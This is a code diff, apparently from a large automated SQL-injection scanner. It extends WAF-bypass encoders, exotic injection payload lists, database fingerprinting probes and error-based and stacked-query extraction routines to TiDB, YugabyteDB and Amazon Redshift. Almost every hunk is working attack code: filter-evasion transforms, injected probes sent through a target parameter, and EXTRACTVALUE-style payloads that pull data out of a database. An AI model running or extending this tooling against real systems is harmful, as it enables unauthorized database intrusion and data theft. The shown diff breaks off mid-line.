@@ -75486,7 +76103,8 @@ class WAFBypassEngine:
     @staticmethod
     def char_encode(p: str, dbms: str = "MySQL") -> str:
         """Replace string literals with CHAR()/CHR() calls."""
-        func = "CHAR" if dbms in ("MySQL","MariaDB","MSSQL","SQLite") else "CHR"
+        func = "CHAR" if dbms in ("MySQL", "MariaDB", "TiDB", "MSSQL", "SQLite") else "CHR"
+        # BUG-CHAR-ENCODE-TIDB FIX: TiDB uses CHAR() like MySQL.
         def charify(m):
             s = m.group(1)
             args = ",".join(str(ord(c)) for c in s)
@@ -75501,7 +76119,9 @@ class WAFBypassEngine:
         for kw in keywords:
             if kw in p.upper():
                 mid = len(kw)//2
-                if dbms in ("MySQL","MariaDB","PostgreSQL","Oracle"):
+                if dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB",
+                            "YugabyteDB", "Amazon Redshift", "Oracle"):
+                    # BUG-CONCAT-SPLIT-TIDB FIX: TiDB uses CONCAT() like MySQL.
                     rep = f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
                 elif dbms == "MSSQL":
                     # FIX-MSSQL-CONCAT: Extra '(' around second string half produced
@@ -75581,7 +76201,7 @@ class WAFBypassEngine:
     @staticmethod
     def concat_char_strings(p: str, dbms: str = "MySQL") -> str:
         """Replace simple string literals with CONCAT(CHAR(n),...) form."""
-        fn = "CHAR" if dbms in ("MySQL","MariaDB","MSSQL","SQLite") else "CHR"
+        fn = "CHAR" if dbms in ("MySQL","MariaDB","TiDB","MSSQL","SQLite") else "CHR"  # BUG-CONCATCHAR-TIDB FIX: TiDB is MySQL-wire-compatible, uses CHAR() not CHR()
         def to_concat(m):
             s = m.group(1)
             parts = ",".join(f"{fn}({ord(c)})" for c in s)
@@ -76065,9 +76685,11 @@ class WAFBypassEngine:
         def mssql_nchar(s: str) -> str:
             return "+".join(f"NCHAR({ord(c)})" for c in s)
 
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-LAYER5-TIDB FIX: TiDB uses CHAR() like MySQL.
+        # BUG-LAYER5-CRDB FIX: CockroachDB/YugabyteDB/Redshift use CHR() like PostgreSQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             encoder = mysql_char
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             encoder = pg_chr
         elif dbms == "MSSQL":
             encoder = mssql_nchar
@@ -76089,8 +76711,9 @@ class WAFBypassEngine:
         if v2 != payload and v2 not in variants:
             variants.append(v2)
 
-        # Concat-split variant for MySQL: 'admin' → CONCAT(CHAR(97),CHAR(100),...)
-        if dbms in ("MySQL", "MariaDB"):
+        # Concat-split variant for MySQL/TiDB: 'admin' → CONCAT(CHAR(97),CHAR(100),...)
+        # BUG-LAYER5-CONCATCHAR-TIDB FIX: TiDB supports CONCAT(CHAR(...)) like MySQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             def concat_char(m):
                 s = m.group(1)
                 if len(s) > 20: return m.group(0)
@@ -76148,7 +76771,9 @@ class WAFBypassEngine:
         starts with a quote."""
         variants = []
 
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-LAYER7-TIDB FIX: TiDB supports CAST AS UNSIGNED and NULL-safe <=> like MySQL.
+        # BUG-LAYER7-CRDB FIX: CockroachDB/YugabyteDB/Redshift support ::int cast like PG.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             # CAST only the tautology literal, not arbitrary = signs
             variants.append(payload.replace("1=1", "CAST(1 AS UNSIGNED)=CAST(1 AS UNSIGNED)"))
             variants.append(payload.replace("'1'", "CAST('1' AS SIGNED)"))
@@ -76157,7 +76782,7 @@ class WAFBypassEngine:
             variants.append(payload.replace("1=2", "1<=>2"))
             variants.append(payload.replace("0=1", "0<=>1"))
 
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             # Cast only the tautology literals, not every = in the payload
             variants.append(payload.replace("1=1", "1::int=1::int"))
             variants.append(payload.replace("1=2", "1::int=2::int"))
@@ -76215,13 +76840,14 @@ class WAFBypassEngine:
         # 6. Subquery scalar equivalent: 1 → (SELECT 1)
         variants.append(re.sub(r'\b1=1\b', '(SELECT 1)=(SELECT 1)', p))
 
-        # 7. MySQL/MariaDB: GREATEST/LEAST  FIX: removed count=0/count=1 (Python kwarg, invalid SQL)
-        if dbms in ("MySQL", "MariaDB"):
+        # 7. MySQL/MariaDB/TiDB: GREATEST/LEAST — BUG-LAYER8-TIDB FIX: TiDB supports these.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             variants.append(re.sub(r'\b1=1\b', 'GREATEST(1, 0)=GREATEST(1, 0)', p))
             variants.append(re.sub(r'\b0=1\b', 'LEAST(0, 1)=GREATEST(0, 1)', p))
 
-        # 8. PostgreSQL: CAST TRUE/FALSE
-        if dbms == "PostgreSQL":
+        # 8. PostgreSQL/CockroachDB/YugabyteDB/Redshift: CAST TRUE/FALSE
+        # BUG-LAYER8-CRDB FIX: wire-compatible PG DBMSes support TRUE/FALSE literals.
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             variants.append(re.sub(r'\b1=1\b', 'TRUE=TRUE', p))
             variants.append(re.sub(r'\b1=2\b', 'TRUE=FALSE', p))
 
@@ -76346,7 +76972,9 @@ class WAFBypassEngine:
         variants: List[str] = []
         p = payload
 
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-LAYER11-TIDB FIX: TiDB supports MySQL versioned comments and NULL-safe <=>.
+        # BUG-LAYER11-CRDB FIX: CockroachDB/YugabyteDB support PG dollar-quoting and ::int.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             # Versioned comment bypass (works on any keyword)
             for kw in ("SELECT","AND","OR","UNION","WHERE","FROM","SLEEP","BENCHMARK"):
                 if kw in p.upper():
@@ -76364,8 +76992,8 @@ class WAFBypassEngine:
             # REGEXP alternative for LIKE
             variants.append(p.replace(' LIKE ', ' REGEXP '))
 
-        elif dbms == "PostgreSQL":
-            # Dollar-quoting
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB"):
+            # Dollar-quoting (Redshift has limited support — excluded)
             variants.append(p.replace("'", "$$"))
             # E-string prefix
             variants.append("E'" + p[1:] if p.startswith("'") else "E'" + p + "'")
@@ -80792,9 +81420,41 @@ class NovelWAFBypass:
             "' AND LENGTH('a')=1-- -",
             "' AND POSITION('a' IN 'abc')=1-- -",
         ],
+        # BUG-EXOTIC-TIDB FIX: TiDB was missing from DBMS_EXOTIC_PAYLOADS.
+        # _dbms_key = dbms if dbms in cls.DBMS_EXOTIC_PAYLOADS else "MySQL" → TiDB→"MySQL".
+        # This caused the cross-DBMS check `if _dbms_key == "TiDB"` at L81446 to be
+        # UNREACHABLE (it runs only after _dbms_key is set, but TiDB got "MySQL" key).
+        # Fix: add TiDB entry so _dbms_key == "TiDB" is reachable, enabling MySQL/MariaDB
+        # cross-payload injection for TiDB targets, and TiDB payloads for MySQL targets.
+        "TiDB": [
+            "' /*!50000AND*/ /*!50000(SELECT*/ /*!500001*/)=1-- -",  # MySQL version comment
+            "' AND TIDB_VERSION() IS NOT NULL-- -",                  # TiDB-exclusive function
+            "' AND IF(1,1,0)-- -",                                   # IF flow control (MySQL-compat)
+            "' AND LENGTH(TIDB_VERSION())>0-- -",                    # version length check
+            "' AND 0x31='1'-- -",                                    # hex string (MySQL-compat)
+            "' AND MID(TIDB_VERSION(),1,1)>'0'-- -",                # MID extraction
+            "`a]1`=1-- -",                                           # backtick identifier quirk
+            "' AND MOD(1,1)=0-- -",                                  # MOD operator
+        ],
+        # BUG-EXOTIC-YUGABYTE FIX: YugabyteDB was missing from DBMS_EXOTIC_PAYLOADS.
+        # _dbms_key = dbms if dbms in cls.DBMS_EXOTIC_PAYLOADS else "MySQL" → YugabyteDB→"MySQL".
+        # This caused YugabyteDB targets to get MySQL exotic payloads (syntax-incompatible)
+        # AND the cross-DBMS check `if _dbms_key in ("YugabyteDB", "Amazon Redshift")` at
+        # L81456 to be UNREACHABLE for YugabyteDB (since _dbms_key was "MySQL", not "YugabyteDB").
+        # Fix: add YugabyteDB entry so _dbms_key == "YugabyteDB" is reachable, enabling
+        # PostgreSQL/CockroachDB cross-payload injection for YugabyteDB targets.
+        "YugabyteDB": [
+            "' AND 1::int=1::int-- -",                               # PG type cast syntax
+            "' AND yb_server_version() IS NOT NULL-- -",             # YugabyteDB-exclusive
+            "' AND LENGTH(yb_server_version())>0-- -",               # version length
+            "' AND ARRAY[1]@>ARRAY[1]-- -",                         # array contains (PG-compat)
+            "' AND CHR(65)='A'-- -",                                 # CHR function (PG-compat)
+            "' AND CURRENT_USER IS NOT NULL-- -",                    # PG-compat
+            "' AND version() LIKE '%YugabyteDB%'-- -",               # version string check
+        ],
     }
-    
-    #  Exotic WAF bypass payloads (cross-DBMS) 
+
+    #  Exotic WAF bypass payloads (cross-DBMS)
     EXOTIC_CROSS_DBMS = [
         # Comment variations WAFs rarely check
         "' AND 1=1-- -",
@@ -80915,6 +81575,23 @@ class NovelWAFBypass:
             elif _dbms_key == "MariaDB":
                 for ep in cls.DBMS_EXOTIC_PAYLOADS.get("MySQL", [])[:5]:
                     variants.append(ep)
+            # BUG-PAYLOAD-CROSS-TIDB FIX: TiDB is MySQL-wire-compatible; also try MySQL/MariaDB
+            # exotic payloads for TiDB targets and vice versa.
+            if _dbms_key == "TiDB":
+                for ep in cls.DBMS_EXOTIC_PAYLOADS.get("MySQL", [])[:5]:
+                    variants.append(ep)
+                for ep in cls.DBMS_EXOTIC_PAYLOADS.get("MariaDB", [])[:3]:
+                    variants.append(ep)
+            elif _dbms_key == "MySQL":
+                for ep in cls.DBMS_EXOTIC_PAYLOADS.get("TiDB", [])[:3]:
+                    variants.append(ep)
+            # BUG-PAYLOAD-CROSS-YG-REDSHIFT FIX: YugabyteDB and Amazon Redshift are
+            # PostgreSQL-wire-compatible; also try PG/CockroachDB payloads.
+            if _dbms_key in ("YugabyteDB", "Amazon Redshift"):
+                for ep in cls.DBMS_EXOTIC_PAYLOADS.get("PostgreSQL", [])[:3]:
+                    variants.append(ep)
+                for ep in cls.DBMS_EXOTIC_PAYLOADS.get("CockroachDB", [])[:3]:
+                    variants.append(ep)
             # Try CockroachDB payloads for PostgreSQL
             if _dbms_key == "PostgreSQL":
                 for ep in cls.DBMS_EXOTIC_PAYLOADS.get("CockroachDB", [])[:3]:
@@ -81030,6 +81707,27 @@ class AdvancedDBMSFingerprinter:
         "Ingres":     [r"E_US\d{4}",
                        r"Ingres DBMS",
                        r"ingres\.jdbc"],
+        # BUG-UNIQUE-ERRORS-TIDB FIX: TiDB has distinct error patterns not shared with MySQL.
+        # TIDB_VERSION function errors and TiDB-specific driver messages identify the target.
+        "TiDB":       [r"tidb_version\(\)",
+                       r"TiDB.*tikv",
+                       r"com\.pingcap\.tidb",
+                       r"tidb\..*error",
+                       r"pingcap/tidb"],
+        # BUG-UNIQUE-ERRORS-YUGABYTE FIX: YugabyteDB errors include YB-specific prefixes
+        # that don't appear in plain PostgreSQL responses.
+        "YugabyteDB": [r"yb_server_version\(\)",
+                       r"YugabyteDB.*YSQL",
+                       r"com\.yugabyte\.ysql",
+                       r"yugabyte\..*error",
+                       r"ERROR.*yb_"],
+        # BUG-UNIQUE-ERRORS-REDSHIFT FIX: Amazon Redshift error messages are distinct
+        # from PostgreSQL — they include Redshift-specific driver references.
+        "Amazon Redshift": [r"Amazon Redshift",
+                            r"com\.amazon\.redshift",
+                            r"redshift\.amazonaws\.com",
+                            r"ERROR: Redshift",
+                            r"amazon\.redshift\.jdbc"],
     }
 
     # DBMS-specific probe functions that exist ONLY in that DBMS
@@ -81076,6 +81774,23 @@ class AdvancedDBMSFingerprinter:
                        ("SELECT SESSION_CONTEXT('APPLICATION') FROM DUMMY", r".*")],
         "Informix":  [("SELECT DBINFO('version','full') FROM systables WHERE tabid=1", r"\d+\.\d+"),
                        ("SELECT DBINFO('dbname') FROM systables WHERE tabid=1", r"\w+")],
+        # BUG-UNIQUE-FUNCS-TIDB FIX: TIDB_VERSION() is TiDB-exclusive — calling it on MySQL
+        # raises ERROR 1305; on TiDB it returns the TiDB version string containing 'tidb'.
+        "TiDB":      [("SELECT TIDB_VERSION()", r"tidb|Release"),
+                       ("SELECT TIDB_DECODE_PLAN('')", r".*"),  # TiDB execution plan decoder
+                       ("SELECT JSON_OBJECT('k', TIDB_VERSION())", r"tidb|Release")],
+        # BUG-UNIQUE-FUNCS-YUGABYTE FIX: yb_server_version() is YugabyteDB-exclusive.
+        # On PostgreSQL/CockroachDB it raises 'function does not exist'; on YugabyteDB
+        # it returns the YugabyteDB version string.
+        "YugabyteDB": [("SELECT yb_server_version()", r"\d+\.\d+"),
+                        ("SELECT yb_server_region()", r"\w+"),   # YB region function
+                        ("SELECT current_setting('yb_read_from_followers')", r".*")],
+        # BUG-UNIQUE-FUNCS-REDSHIFT FIX: Amazon Redshift has functions not present in
+        # standard PostgreSQL, allowing positive fingerprinting without relying on
+        # error messages alone.
+        "Amazon Redshift": [("SELECT pg_last_query_id()", r"\d+"),   # Redshift-only
+                             ("SELECT CURRENT_USER_ID", r"\d+"),     # Redshift integer user ID
+                             ("SELECT PG_BACKEND_PID()", r"\d+")],   # present in Redshift
     }
 
     # Stack trace DBMS identifiers  (framework + DBMS combinations)
@@ -81171,6 +81886,21 @@ class AdvancedDBMSFingerprinter:
                 best  = "MariaDB"
                 score = min(1.0, score + 0.10)
 
+        # BUG-FINGERPRINT-TIDB FIX: Distinguish MySQL/MariaDB from TiDB.
+        # TiDB is MySQL-wire-compatible so the initial probe may identify it as "MySQL"
+        # or "MariaDB" (if @@version contains a MySQL version string). TIDB_VERSION() is
+        # a TiDB-exclusive function that does not exist in MySQL or MariaDB — calling it
+        # on a real MySQL/MariaDB server raises "ERROR 1305: FUNCTION tidb_version does
+        # not exist", changing the response. On TiDB it returns the TiDB version string.
+        # Without this check, TiDB targets are persistently misidentified as MySQL,
+        # causing all TiDB-specific dispatch corrections to be silently bypassed.
+        if best in ("MySQL", "MariaDB"):
+            is_tidb = await self._check_tidb(
+                result, method, url, data, data_fmt, original, tamper_chain)
+            if is_tidb:
+                best  = "TiDB"
+                score = min(1.0, score + 0.15)
+
         # Distinguish PostgreSQL from CockroachDB
         if best == "PostgreSQL":
             is_crdb = await self._check_cockroachdb(
@@ -81178,6 +81908,29 @@ class AdvancedDBMSFingerprinter:
             if is_crdb:
                 best  = "CockroachDB"
                 score = min(1.0, score + 0.10)
+
+        # BUG-FINGERPRINT-YUGABYTE FIX: Distinguish PostgreSQL/CockroachDB from YugabyteDB.
+        # YugabyteDB exposes yb_server_version() which does not exist in PG or CRDB.
+        if best in ("PostgreSQL", "CockroachDB"):
+            is_yugabyte = await self._check_yugabyte(
+                result, method, url, data, data_fmt, original, tamper_chain)
+            if is_yugabyte:
+                best  = "YugabyteDB"
+                score = min(1.0, score + 0.15)
+
+        # BUG-FINGERPRINT-REDSHIFT FIX: Amazon Redshift was never identified as such —
+        # it always resolved to "PostgreSQL", "CockroachDB", or "YugabyteDB" because no
+        # _check_redshift() method existed and fingerprint() never tested for it.
+        # All Redshift-specific dispatch (OOB payloads, schema enum fallbacks, etc.)
+        # was permanently bypassed. Fix: probe Redshift-exclusive functions after the
+        # PostgreSQL/CockroachDB/YugabyteDB checks so Redshift is only reached when
+        # the target is genuinely not one of those other PG-wire engines.
+        if best in ("PostgreSQL", "CockroachDB", "YugabyteDB"):
+            is_redshift = await self._check_redshift(
+                result, method, url, data, data_fmt, original, tamper_chain)
+            if is_redshift:
+                best  = "Amazon Redshift"
+                score = min(1.0, score + 0.20)
 
         # Distinguish MSSQL from Sybase (Sybase errors mention "Adaptive Server")
         if best == "MSSQL" and version:
@@ -81292,21 +82045,29 @@ class AdvancedDBMSFingerprinter:
                                 original, tamper_chain, baseline) -> Tuple[str, str]:
         """Extract version string and identify DBMS from it."""
         version_queries = {
-            "MySQL":      "SELECT VERSION()",
-            "MSSQL":      "SELECT @@VERSION",
-            "PostgreSQL": "SELECT version()",
-            "Oracle":     "SELECT banner FROM v$version WHERE ROWNUM=1",
-            "SQLite":     "SELECT sqlite_version()",
-            "MariaDB":    "SELECT VERSION()",
-        }
+            "MySQL":            "SELECT VERSION()",
+            "MSSQL":            "SELECT @@VERSION",
+            "PostgreSQL":       "SELECT version()",
+            "Oracle":           "SELECT banner FROM v$version WHERE ROWNUM=1",
+            "SQLite":           "SELECT sqlite_version()",
+            "MariaDB":          "SELECT VERSION()",
+            "TiDB":             "SELECT TIDB_VERSION()",  # BUG-FINGERPRINT-TIDB-VER FIX: TiDB has its own version function
+            "CockroachDB":      "SELECT version()",
+            "YugabyteDB":       "SELECT version()",
+            "Amazon Redshift":  "SELECT version()",
+        }  # BUG-FINGERPRINT-NEWDBMS-VERQ FIX: added TiDB/CRDB/YugabyteDB/Redshift version queries
         version_patterns = {
-            "MySQL":      r"(\d+\.\d+\.\d+)",
-            "MSSQL":      r"Microsoft SQL Server (\d{4})",
-            "PostgreSQL": r"PostgreSQL (\d+\.\d+)",
-            "Oracle":     r"Oracle.*(\d+[cg]?\s*Release\s*[\d\.]+)",
-            "SQLite":     r"(\d+\.\d+\.\d+)",
-            "MariaDB":    r"(\d+\.\d+\.\d+.*MariaDB)",
-        }
+            "MySQL":            r"(\d+\.\d+\.\d+)",
+            "MSSQL":            r"Microsoft SQL Server (\d{4})",
+            "PostgreSQL":       r"PostgreSQL (\d+\.\d+)",
+            "Oracle":           r"Oracle.*(\d+[cg]?\s*Release\s*[\d\.]+)",
+            "SQLite":           r"(\d+\.\d+\.\d+)",
+            "MariaDB":          r"(\d+\.\d+\.\d+.*MariaDB)",
+            "TiDB":             r"(Release.*tidb-\d+\.\d+\.\d+|tidb-\d+\.\d+\.\d+|\d+\.\d+\.\d+)",  # BUG-FINGERPRINT-TIDB-VERPAT FIX
+            "CockroachDB":      r"CockroachDB.*v(\d+\.\d+\.\d+)",
+            "YugabyteDB":       r"PostgreSQL.*YB-(\d+\.\d+)|yugabyte",
+            "Amazon Redshift":  r"Redshift.*(\d+\.\d+\.\d+)|redshift",
+        }  # BUG-FINGERPRINT-NEWDBMS-VERPAT FIX: added version string patterns for wire-compat engines
 
         if result.technique == "U" and result.union_columns > 0:
             # Union-based version extraction (fastest)
@@ -81329,7 +82090,7 @@ class AdvancedDBMSFingerprinter:
 
         else:
             # Error-based version extraction
-            for dbms in ("MySQL","MSSQL","PostgreSQL","Oracle","SQLite"):
+            for dbms in ("MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"):  # BUG-VEREXTRACT-NEWDBMS FIX: wire-compat engines added
                 qmap = DBMS_QUERIES.get(dbms, {})
                 if not qmap: continue
                 try:
@@ -81436,10 +82197,135 @@ class AdvancedDBMSFingerprinter:
 
         return False
 
+    async def _check_tidb(self, result, method, url, data, data_fmt,
+                           original, tamper_chain) -> bool:
+        """Distinguish TiDB from MySQL/MariaDB.
+        BUG-FINGERPRINT-TIDB FIX: TIDB_VERSION() is a TiDB-exclusive function.
+        On MySQL/MariaDB it raises ERROR 1305 (function does not exist).
+        On TiDB it returns a version string containing 'tidb'.
+        Strategy 1: probe via boolean (IF TIDB_VERSION() succeeds, length > 0).
+        Strategy 2: check error response body for 'tidb' string."""
+        # Strategy 1: boolean probe — TiDB returns non-empty TIDB_VERSION(); MySQL errors
+        try:
+            _tidb_probe_true  = original + "' AND LENGTH(TIDB_VERSION())>0-- -"
+            _tidb_probe_false = original + "' AND LENGTH(TIDB_VERSION())>999999-- -"
+            fp_t = await _send_injected(self.engine, method, url, data, data_fmt,
+                                        result.param, _tidb_probe_true, tamper_chain)
+            fp_f = await _send_injected(self.engine, method, url, data, data_fmt,
+                                        result.param, _tidb_probe_false, tamper_chain)
+            body_t = _safe_decode_body(fp_t, encoding="utf-8", errors="replace", func_name="extraction")
+            # If "tidb" appears in either response body, confirmed TiDB
+            if re.search(r"tidb", body_t, re.I):
+                return True
+            # Check for meaningful true/false oracle difference (MySQL would error on both)
+            has_err_t = any(re.search(pat, body_t, re.I)
+                            for pats in SQL_ERROR_PATTERNS.values() for pat in pats)
+            if not has_err_t:
+                # TiDB successfully evaluated TIDB_VERSION()
+                body_f = _safe_decode_body(fp_f, encoding="utf-8", errors="replace", func_name="extraction")
+                norm_t = ResponseNormaliser.normalise(_extract_body_safe(fp_t)) if _validate_response(fp_t, allow_empty=True) else b""
+                norm_f = ResponseNormaliser.normalise(_extract_body_safe(fp_f)) if _validate_response(fp_f, allow_empty=True) else b""
+                sim = SimHasher.body_similarity(norm_t, norm_f)
+                if sim < 0.90:
+                    return True  # Different response for true vs false — TiDB oracle working
+        except Exception as _e:
+            LOG.debug("_check_tidb strategy 1 error: %s", _e)
 
-# 
+        # Strategy 2: error-injection probe — TIDB_VERSION() in EXTRACTVALUE
+        try:
+            fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                      result.param,
+                                      original + "' AND EXTRACTVALUE(1,TIDB_VERSION())-- -",
+                                      tamper_chain)
+            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+            if re.search(r"tidb", body, re.I):
+                return True
+        except Exception as _e:
+            LOG.debug("_check_tidb strategy 2 error: %s", _e)
+
+        return False
+
+    async def _check_yugabyte(self, result, method, url, data, data_fmt,
+                               original, tamper_chain) -> bool:
+        """Distinguish YugabyteDB from PostgreSQL/CockroachDB.
+        BUG-FINGERPRINT-YUGABYTE FIX: yb_server_version() is a YugabyteDB-exclusive
+        function. On PostgreSQL/CockroachDB it raises 'function does not exist'.
+        On YugabyteDB it returns the version string."""
+        try:
+            fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                      result.param,
+                                      original + "' AND LENGTH(yb_server_version())>0-- -",
+                                      tamper_chain)
+            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+            if re.search(r"yugabyte|ysql", body, re.I):
+                return True
+            has_err = any(re.search(pat, body, re.I)
+                         for pats in SQL_ERROR_PATTERNS.values() for pat in pats)
+            if not has_err and _get_safe_status_code(fp) < 500:
+                return True
+        except Exception as _e:
+            LOG.debug("_check_yugabyte error: %s", _e)
+
+        return False
+
+    async def _check_redshift(self, result, method, url, data, data_fmt,
+                               original, tamper_chain) -> bool:
+        """Distinguish Amazon Redshift from PostgreSQL/CockroachDB/YugabyteDB.
+        BUG-FINGERPRINT-REDSHIFT FIX: Amazon Redshift exposes functions and system tables
+        not present in standard PostgreSQL. PG_LAST_QUERY_ID() and CURRENT_USER_ID are
+        Redshift-exclusive — calling them on PostgreSQL raises 'function does not exist'.
+        Strategy 1: probe pg_last_query_id() — Redshift-specific integer function.
+        Strategy 2: check response body for 'redshift' string in errors or version output.
+        Strategy 3: probe CURRENT_USER_ID — Redshift returns an integer user ID."""
+        # Strategy 1: pg_last_query_id() — Redshift-exclusive function returning integer
+        try:
+            fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                      result.param,
+                                      original + "' AND PG_LAST_QUERY_ID()>=0-- -",
+                                      tamper_chain)
+            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+            if re.search(r"redshift", body, re.I):
+                return True
+            has_err = any(re.search(pat, body, re.I)
+                         for pats in SQL_ERROR_PATTERNS.values() for pat in pats)
+            if not has_err and _get_safe_status_code(fp) < 500:
+                # pg_last_query_id() was accepted without error — strong Redshift signal
+                return True
+        except Exception as _e:
+            LOG.debug("_check_redshift strategy 1 error: %s", _e)
+
+        # Strategy 2: check for 'redshift' in version() output via error injection
+        try:
+            fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                      result.param,
+                                      original + "' AND 1=CAST((SELECT version()) AS integer)-- -",
+                                      tamper_chain)
+            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+            if re.search(r"redshift", body, re.I):
+                return True
+        except Exception as _e:
+            LOG.debug("_check_redshift strategy 2 error: %s", _e)
+
+        # Strategy 3: CURRENT_USER_ID — Redshift returns integer user ID; PG does not have it
+        try:
+            fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                      result.param,
+                                      original + "' AND CURRENT_USER_ID>0-- -",
+                                      tamper_chain)
+            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+            has_err = any(re.search(pat, body, re.I)
+                         for pats in SQL_ERROR_PATTERNS.values() for pat in pats)
+            if not has_err and _get_safe_status_code(fp) < 500:
+                return True
+        except Exception as _e:
+            LOG.debug("_check_redshift strategy 3 error: %s", _e)
+
+        return False
+
+
+#
 # SCANNER V7   integrates all new v7 systems
-# 
+#
 
 class ScannerV7(ScannerV6):
     """
@@ -83767,12 +84653,17 @@ class FastExtractionEngine:
                     _ora_chunk_scalar = sql_query
                 chunk_sql = f"SELECT SUBSTR(({_ora_chunk_scalar}),{start},{chunk_size}) FROM DUAL"
             else:
+                # BUG-FEE-TIDB-CHUNKSQL: TiDB is MySQL-compatible, SUBSTR and SUBSTRING both valid.
+                # Explicit MySQL SUBSTR (no SELECT wrapper needed — MySQL executes bare SUBSTR()).
                 chunk_sql = f"SELECT SUBSTR(({sql_query}),{start},{chunk_size})"
 
             # FIX-v19.18: DBMS-specific error trigger payloads
             # ROOT CAUSE FIX: Build PAYLOAD BODIES separately from context prefixes
             # to allow proper context switching (numeric vs string) during extraction
-            if dbms in ("MySQL","MariaDB"):
+            # BUG-FEE-TIDB-ERRCHUNK FIX: TiDB was absent from MySQL/MariaDB payload_body branch
+            # and fell to the else-fallback (EXTRACTVALUE) which is correct for TiDB but
+            # implicit. TiDB supports EXTRACTVALUE() identically to MySQL — add explicitly.
+            if dbms in ("MySQL","MariaDB","TiDB"):
                 payload_body = f"AND EXTRACTVALUE(1,CONCAT(0x7e,({chunk_sql}),0x7e))-- -"
             elif dbms in ("MSSQL", "Sybase"):
                 payload_body = f"AND 1=CONVERT(int,({chunk_sql}))-- -"
@@ -84206,7 +85097,13 @@ class FastExtractionEngine:
                 # error message. This produced garbage like "]^¨¾1¥À?³?ºéÍÄØ".
                 # Fix: try DBMS-specific anchored patterns FIRST; fall through to broad
                 # patterns only as a last resort.
-                if not m and dbms not in ("MySQL", "MariaDB"):
+                # BUG-FEE-TIDB-ERRPATTERN FIX: TiDB added to MySQL/MariaDB group.
+                # TiDB EXTRACTVALUE() produces identical ~value~ / XPATH syntax error output.
+                # Without this exclusion, TiDB falls into the DBMS-specific pattern block
+                # which lacks a TiDB entry — the XPATH pattern at line 84290 is actually
+                # broader than the ~~ tilde match above and can work, but the exclusion
+                # prevents unnecessary extra passes for a DBMS that already matched ~value~.
+                if not m and dbms not in ("MySQL", "MariaDB", "TiDB"):
                     # Try DBMS-specific anchored error patterns first
                     _err_patterns_early = [
                         r"XPATH syntax error: '([^']+)'",
@@ -84439,10 +85336,11 @@ class FastExtractionEngine:
         _ses_req_count = [0]
 
         try:
-            if dbms in ("MySQL", "MariaDB"):
-                # MYSQL: Execute stacked query to prove capability, then extract directly
+            if dbms in ("MySQL", "MariaDB", "TiDB"):
+                # MYSQL/TiDB: Execute stacked query to prove capability, then extract directly
                 # The stacked query verifies we CAN execute multiple statements.
-                # FIX: Do NOT try to retrieve @_exfil_result in a second request - 
+                # BUG-STACKED-EXTRACT-TIDB FIX: TiDB supports stacked queries and SET @var syntax.
+                # FIX: Do NOT try to retrieve @_exfil_result in a second request -
                 # just extract the ORIGINAL sql_query using error-based methods.
                 _sep = "; "  # Separator for stacked query
                 if _det_prefix:
@@ -84542,9 +85440,10 @@ class FastExtractionEngine:
                     LOG.debug(f"[stacked_extract_string] MSSQL stacked verification failed: {e}")
                     return await self.error_extract_string(sql_query, dbms, max_len)
                 
-            elif dbms == "PostgreSQL" or dbms == "CockroachDB":
-                # PostgreSQL: Stacked queries via DO blocks not reliable in HTTP context
-                # Fall back to error-based extraction directly
+            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-STACKED-EXTRACT-CRDB FIX: YugabyteDB and Amazon Redshift are PG-wire-
+                # compatible; stacked queries via DO blocks are also unreliable for them.
+                # Fall back to error-based extraction directly.
                 return await self.error_extract_string(sql_query, dbms, max_len)
                 
             elif dbms == "Oracle":
@@ -89812,7 +90711,7 @@ class WebSocketInjector:
 
                 # Try error-based payloads  BUG-2 FIX (Req 1): CERTIFIED_PAYLOAD_DATABASE only
                 _ws_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-                _ws_dbms_list = [_ws_dbms] if _ws_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+                _ws_dbms_list = [_ws_dbms] if _ws_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
                 # FIX-R1/R2: _get_cascade_payloads gives ALL 10 CERTIFIED_PAYLOAD_DATABASE categories.
                 # FIX-R6: mutate_all() applies all 20 mutation layers.
                 # FIX-R9: asyncio.sleep(0) yields event loop between iterations.
@@ -90081,7 +90980,7 @@ class GRPCWebInjector:
 
             # Error-based probes  BUG-2 FIX (Req 1): CERTIFIED_PAYLOAD_DATABASE only
             _grpc_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-            _grpc_list = [_grpc_dbms] if _grpc_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
